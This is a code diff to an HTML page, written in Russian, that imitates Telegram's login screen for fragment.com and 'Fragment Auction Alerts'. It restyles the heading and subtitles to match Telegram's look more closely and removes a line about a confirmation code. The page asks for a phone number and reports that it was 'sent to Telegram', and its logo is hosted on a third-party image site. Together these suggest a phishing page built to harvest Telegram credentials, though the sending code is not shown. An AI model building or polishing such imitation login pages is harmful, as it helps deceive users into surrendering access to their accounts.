@@ -151,6 +151,16 @@
             color: #3390ec;
             font-weight: 500;
         }
+
+        .gray-bold {
+            color: #707579;
+            font-weight: 600;
+        }
+
+        .blue-normal {
+            color: #3390ec;
+            font-weight: normal;
+        }
         
         .buttons {
             display: flex;
@@ -408,9 +418,19 @@
             <div class="logo">
                 <img src="https://habrastorage.org/getpro/geektimes/post_images/d67/a9c/7dc/d67a9c7dc9801474767d47660640626c.jpg" alt="Logo">
             </div>
-            <h1>Войдите, чтобы использовать аккаунт Telegram</h1>
-            <p class="subtitle">для <a href="https://fragment.com" class="fragment-link">fragment.com</a> и <span class="fragment-text">Fragment Auction Alerts</span>.</p>
-            <p class="subtitle">Введите свой номер телефона в международном формате.</p>
+            <h1>Войдите, чтобы<br>использовать аккаунт Telegram</h1>
+            <p class="subtitle">
+                <span class="gray-bold">для</span> 
+                <a href="https://fragment.com" class="fragment-link">fragment.com</a> 
+                <span class="gray-bold">и</span> 
+                <span class="fragment-text">Fragment Auction Alerts</span>
+                <span class="gray-bold">.</span>
+            </p>
+            <p class="subtitle">
+                <span class="gray-bold">Введите свой номер телефона в</span> 
+                <span class="blue-normal">международном формате</span>
+                <span class="gray-bold">.</span>
+            </p>
             <p class="subtitle">Подтверждение будет отправлено в Telegram.</p>
         </div>
         
@@ -428,8 +448,6 @@
                     <input type="tel" class="phone-field" id="phoneInput" placeholder="Номер телефона" inputmode="tel">
                 </div>
             </div>
-            
-            <p class="info-text">На ваш номер будет отправлен код подтверждения.</p>
             
             <div class="loading" id="loading">Отправка данных...</div>
             <div class="success-message" id="successMessage">Номер успешно отправлен в Telegram!</div>
